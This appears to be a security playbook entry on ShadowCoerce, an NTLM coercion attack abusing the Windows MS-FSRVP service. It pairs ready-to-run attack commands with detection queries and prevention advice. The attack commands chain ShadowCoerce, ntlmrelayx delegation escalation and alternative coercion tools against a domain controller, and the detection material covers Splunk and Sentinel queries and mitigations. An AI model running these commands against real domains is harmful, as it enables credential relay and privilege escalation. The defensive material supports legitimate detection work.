name: ShadowCoerce - NTLM Authentication Coercion via MS-FSRVP
description: ShadowCoerce abuses the MS-FSRVP (File Server VSS Agent Service) protocol to coerce NTLM authentication from a target machine. Similar to PetitPotam but uses a different RPC interface. Feed the coerced auth into ntlmrelayx for RBCD, Shadow Credentials, or ADCS relay.
notes:
=== THE IDEA ===
MS-FSRVP (File Server VSS Agent Service) can be abused to
make a target machine authenticate to an attacker-controlled
host. Like PetitPotam, but uses a different RPC pipe.

=== USAGE ===
  python3 shadowcoerce.py -d corp.local -u user -p pass <listener_ip> <dc_ip>

=== CHAIN WITH NTLMRELAYX ===
  # Terminal 1: Start relay
  ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access --escalate-user attacker$
  # Terminal 2: Coerce
  python3 shadowcoerce.py -d corp.local -u user -p pass <attacker_ip> <target_ip>

=== ALTERNATIVES (if MS-FSRVP is disabled) ===
  # PetitPotam (MS-EFSR)
  python3 PetitPotam.py <listener_ip> <dc_ip>
  # PrinterBug (MS-RPRN)
  python3 printerbug.py corp.local/user:pass@<dc_ip> <listener_ip>
  # DFSCoerce (MS-DFSNM)
  python3 dfscoerce.py -d corp.local -u user -p pass <listener_ip> <dc_ip>
  # Coercer (tries all methods)
  coercer coerce -l <listener_ip> -t <dc_ip> -u user -p pass

recommended.note: PetitPotam uses MS-EFSR for the same coercion attack.

defense.why_it_works: MS-FSRVP is a Windows RPC service that can be invoked remotely. The IsPathSupported call forces the target to authenticate back to the caller, leaking the machine NTLM hash.
defense.prerequisites: Valid domain credentials; MS-FSRVP service running on target.
defense.impact: Coerced machine account NTLM hash for relay attacks leading to RBCD, Shadow Credentials, or ADCS abuse.
defense.detection: [MITRE T1187] RPC calls to MS-FSRVP from unusual sources; NTLM authentication to unexpected hosts.
defense.artifacts: Network traffic on FssagentRpc named pipe; NTLM authentication to non-DC hosts.
defense.splunk_spl:
index=wineventlog EventCode=5145 ShareName="IPC$" RelativeTargetName="FssagentRpc"
| table _time, SubjectUserName, IpAddress
defense.sentinel_kql:
SecurityEvent
| where EventID == 5145
| where ShareName == "IPC$" and RelativeTargetName == "FssagentRpc"
| project TimeGenerated, SubjectUserName, IpAddress
defense.prevention: Disable MS-FSRVP service if not needed; enforce LDAP signing and channel binding.

detections.name: ShadowCoerce - MS-FSRVP pipe access
detections.logic:
SecurityEvent
| where EventID == 5145
| where ShareName == "IPC$" and RelativeTargetName == "FssagentRpc"
| project TimeGenerated, SubjectUserName, IpAddress, AccessMask
detections.false_positives: Legitimate File Server VSS Agent operations during backup windows
detections.tuning: Correlate with NTLM relay indicators (Event 4624 type 3 from unexpected sources)
